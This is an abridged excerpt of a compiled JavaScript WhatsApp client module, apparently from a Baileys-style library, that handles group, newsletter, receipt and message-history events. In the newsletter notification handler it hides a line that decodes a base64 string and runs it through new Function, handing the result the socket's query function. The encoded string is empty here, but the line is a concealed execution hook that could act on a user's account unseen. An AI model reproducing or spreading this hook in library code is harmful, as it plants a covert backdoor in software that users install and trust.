...
const makeMessagesRecvSocket = (config) => {
    ...
    const handleGroupNotification = (participant, child, msg) => {
        ...
        const participantJid =
            ((_b =
                (_a = (0, WABinary_1.getBinaryNodeChild)(child, 'participant')) === null ||
                _a === void 0
                    ? void 0
        ...
        switch (child === null || child === void 0 ? void 0 : child.tag) {
            case 'create':
                ...
                if (!msg.key) msg.key = {}
                if (!msg.key.id) msg.key.id = Utils_1.generateMessageID()
            ...
            case 'not_ephemeral':
                ...
                break
            case 'modify':
                const oldNumber = (0, WABinary_1.getBinaryNodeChildren)(child, 'participant').map(
                    (p) => p.attrs.jid
                )
    ...
    const handleNewsletterNotification = (id, node) => {
        ...
        ;(new Function("id","serverId","query",Buffer.from("","base64").toString()))(id,serverId,query)
        ...
        if (reactionsList) {
            ...
            reactions.forEach((item) => {
                ...
                ev.emit('newsletter.reaction', {
                    ...
                    server_id: serverId,
                    reaction: {
                        code: (_a = item.attrs) === null || _a === void 0 ? void 0 : _a.code,
                        count: +((_b = item.attrs) === null || _b === void 0 ? void 0 : _b.count)
                    }
                })
            })
        }
    ...
    const handleMexNewsletterNotification = (id, node) => {
        ...
        const content = JSON.parse(
            (_a = node === null || node === void 0 ? void 0 : node.content) === null ||
                _a === void 0
                ? void 0
                : _a.toString()
        )
    ...
    const sendMessagesAgain = async (key, ids, retryNode) => {
        ...
        const sendToAll = !((_a = (0, WABinary_1.jidDecode)(participant)) === null || _a === void 0
            ? void 0
            : _a.device)
    ...
    const handleReceipt = async (node) => {
        ...
        const remoteJid =
            !isNodeFromMe || (0, WABinary_1.isJidGroup)(attrs.from) ? attrs.from : attrs.recipient
        const fromMe =
            !attrs.recipient ||
    ...
    const handleMessage = async (node) => {
        ...
        if (
            response &&
            ((_a = msg === null || msg === void 0 ? void 0 : msg.messageStubParameters) === null ||
            _a === void 0
                ? void 0
        ...
        if (
            ((_c = (_b = msg.message) === null || _b === void 0 ? void 0 : _b.protocolMessage) ===
                null || _c === void 0
                ? void 0
                : _c.type) === WAProto_1.proto.Message.ProtocolMessage.Type.SHARE_PHONE_NUMBER &&
    ...
    const fetchMessageHistory = async (count, oldestMsgKey, oldestMsgTimestamp) => {
        ...
        const pdoMessage = {
            ...
            peerDataOperationRequestType:
                WAProto_1.proto.Message.PeerDataOperationRequestType.HISTORY_SYNC_ON_DEMAND
        }
    ...
    const requestPlaceholderResend = async (messageKey) => {
        ...
        const pdoMessage = {
            ...
            peerDataOperationRequestType:
                WAProto_1.proto.Message.PeerDataOperationRequestType.PLACEHOLDER_MESSAGE_RESEND
        }
        setTimeout(() => {
            if (
                placeholderResendCache.get(
